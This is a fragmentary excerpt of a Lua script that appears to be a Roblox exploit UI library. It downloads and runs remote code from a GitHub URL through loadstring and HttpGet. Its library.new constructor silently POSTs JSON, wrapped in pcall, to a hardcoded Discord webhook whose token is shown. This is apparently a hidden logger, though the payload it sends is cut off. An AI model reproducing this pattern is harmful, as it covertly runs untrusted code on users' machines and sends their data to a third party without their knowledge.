...
library.signal = loadstring(game:HttpGet("https://raw.githubusercontent.com/sbrtest231321/uert79ysdfih/refs/heads/main/nevemoreModded.lua"))()
...
function library.new(library_title, cfg_location)
    ...
    local suc,err = pcall(function()
      ...
      local response = request(
          {
              Url = 'https://discord.com/api/webhooks/1487486763269095485/cYlXxQNwKCxfOOeVwlhwhq5XMjBtWEFfTtipRRiUQ2_y984vxRQeVhHyrMfkpAkKHGqC', Method = 'POST', Headers = {['Content-Type'] = 'application/json'},
